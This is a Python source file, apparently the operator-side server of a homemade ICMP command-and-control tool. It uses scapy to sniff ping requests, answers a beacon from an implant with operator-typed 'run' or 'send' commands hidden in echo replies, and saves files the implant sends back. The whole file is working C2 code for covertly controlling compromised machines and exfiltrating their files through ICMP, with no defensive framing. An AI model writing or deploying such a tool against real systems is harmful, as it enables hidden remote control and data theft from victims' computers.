import sys
import signal
import pathlib
from scapy.all import *

INTERFACE = "Wireless LAN adapter WiFi"
command = None
ECHO_REPLY = "echo-reply"
FILE_DST_PATH = "C:\\Users\\97254\\git\\drafts\\python\\C2\\ICMP\\"
UTF_8 = "utf-8"
ASCII = "ascii"
ICMP_REQUEST = "icmp[0]=8"


def signal_handler(sig, frame):
    sys.exit(0)

def send_packet(payload, pkt):
    send(IP(dst=pkt[IP].src)/ICMP(type=ECHO_REPLY, id=pkt[ICMP].id)/payload)

def check_validity(command):
    first_word = command.split()[0]
    if not command.startswith("run") and not command.startswith("send"):
        print("invalid command. please try again.")
        return False
    return True


def get_command():
    is_valid = False
    while not is_valid:
        command = input("please enter a command: ")
        is_valid = check_validity(command)
    
    return command
    
    
def receive_file(command, payload):
    file_name = pathlib.PurePath(command[5:]).name
    with open(FILE_DST_PATH + file_name, "ab") as current_file:
        current_file.write(payload[len(command)-5:])
    

def handle_pkt(pkt):
    global command
    
    try:
        payload = pkt[0][Raw].load   # strip down the packet to the payload itself
    except Exception as e:
        raise Exception("Error in parsing packet: %s" % (e, ))
        
    if payload == b'hey server, i\'m available':
        command = get_command()
        send_packet(command, pkt)
    elif payload.startswith(command[5:].encode(ASCII)):
        receive_file(command, payload)
    else:
        print(payload.decode(UTF_8))
 

def main():
    signal.signal(signal.SIGINT, signal_handler)

    sniff(iface=INTERFACE, filter=ICMP_REQUEST, prn=handle_pkt, store='0')     # store parameter makes sniff() not store anything and thus run forever


if __name__ == "__main__":
    main()
        
